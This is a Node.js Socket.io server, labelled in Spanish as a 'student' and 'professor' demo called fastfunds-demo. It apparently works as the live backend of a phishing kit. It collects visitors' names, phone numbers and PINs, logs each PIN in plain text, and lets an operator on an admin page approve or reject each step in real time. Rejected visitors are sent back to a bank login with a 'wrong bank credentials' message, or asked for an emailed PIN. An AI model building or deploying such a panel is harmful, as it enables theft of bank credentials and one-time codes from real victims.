const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);

// Configuración correcta de Socket.io para Render
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

app.use(express.static('public'));

let pendingRequests = [];

io.on('connection', (socket) => {
  console.log('✅ Cliente conectado:', socket.id);
  socket.emit('listaActualizada', pendingRequests);

  // Etapa 1: Estudiante envía formulario
  socket.on('enviarSolicitud', (data) => {
    const request = {
      id: crypto.randomUUID(),
      nombre: data.nombre,
      apellido: data.apellido,
      telefono: data.telefono,
      genero: data.genero,
      socketId: socket.id,
      pinIngresado: null,
      estado: 'esperando_aprobacion1'
    };
    pendingRequests.push(request);
    io.emit('listaActualizada', pendingRequests);
    io.to(socket.id).emit('esperandoAprobacion1');
    console.log(`📨 Solicitud etapa 1 de ${data.nombre}`);
  });

  // Etapa 2: Estudiante verifica PIN
  socket.on('verificarPIN', ({ pin }) => {
    const request = pendingRequests.find(r => r.socketId === socket.id);
    if (request) {
      request.pinIngresado = pin;
      request.estado = 'esperando_aprobacion2';
      io.emit('listaActualizada', pendingRequests);
      io.to(socket.id).emit('esperandoAprobacion2');
      console.log(`🔑 PIN recibido de ${request.nombre}: ${pin}`);
    }
  });

  // Profesor: Aprobar etapa 1
  socket.on('aprobarEtapa1', (requestId) => {
    const request = pendingRequests.find(r => r.id === requestId);
    if (request && request.estado === 'esperando_aprobacion1') {
      request.estado = 'pin_pendiente';
      io.emit('listaActualizada', pendingRequests);
      io.to(request.socketId).emit('pasarAPIN');
      console.log(`✅ Etapa 1 aprobada: ${request.nombre}`);
    }
  });

    socket.on('aprobarEtapa1Correo', (requestId) => {
  const request = pendingRequests.find(r => r.id === requestId);
  if (request && request.estado === 'esperando_aprobacion1') {
    request.estado = 'pin_pendiente';
    io.emit('listaActualizada', pendingRequests);
    io.to(request.socketId).emit('pasarAPINCorreo');
    console.log(`✅ Etapa 1 aprobada con PIN CORREO: ${request.nombre}`);
  }
});

    // Profesor: Declinar etapa 1 → ahora devuelve al cliente al login del banco
  socket.on('declinarEtapa1', (requestId) => {
    const request = pendingRequests.find(r => r.id === requestId);
    if (request && request.estado === 'esperando_aprobacion1') {
      io.to(request.socketId).emit('credencialesBancoIncorrectas');
      pendingRequests = pendingRequests.filter(r => r.id !== requestId);
      io.emit('listaActualizada', pendingRequests);
      console.log(`🔄 Etapa 1 declinada (reintento banco): ${request.nombre}`);
    }
  });

  // Profesor: Aprobar etapa 2 (final)
  socket.on('aprobarEtapa2', (requestId) => {
    const request = pendingRequests.find(r => r.id === requestId);
    if (request) {
      io.to(request.socketId).emit('solicitudAprobada', request);
      pendingRequests = pendingRequests.filter(r => r.id !== requestId);
      io.emit('listaActualizada', pendingRequests);
      console.log(`✅ Etapa 2 aprobada (final): ${request.nombre}`);
    }
  });

  // Profesor: Declinar etapa 2
  socket.on('declinarEtapa2', (requestId) => {
    const request = pendingRequests.find(r => r.id === requestId);
    if (request) {
      io.to(request.socketId).emit('codigoIncorrecto');
      console.log(`❌ Etapa 2 declinada: ${request.nombre}`);
    }
  });

  // Reiniciar demo
  socket.on('reiniciar', () => {
    pendingRequests = [];
    io.emit('listaActualizada', pendingRequests);
    io.emit('reiniciar');
  });

  socket.on('disconnect', () => {
    console.log('❌ Cliente desconectado:', socket.id);
  });
});

// ←←← ESTO ES LO MÁS IMPORTANTE PARA RENDER
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀 Servidor listo en puerto ${PORT}`);
  console.log(`   Estudiante → https://fastfunds-demo.onrender.com`);
  console.log(`   Profesor   → https://fastfunds-demo.onrender.com/admin.html`);
});
